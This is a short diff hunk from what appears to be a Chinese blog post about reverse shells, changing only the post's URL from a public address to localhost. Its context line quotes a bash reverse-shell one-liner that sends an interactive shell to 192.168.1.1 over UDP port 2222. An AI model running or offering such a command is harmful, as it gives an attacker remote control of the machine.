@@ -100,5 +100,5 @@ bash -i &gt;&amp; /dev/udp/192.168.1.1/2222 0&gt;&amp;1
 ---
 
 > 作者: Gh0stX  
-> URL: https://www.bthoughts.top/posts/revshell/  
+> URL: http://localhost:1313/posts/revshell/  
 
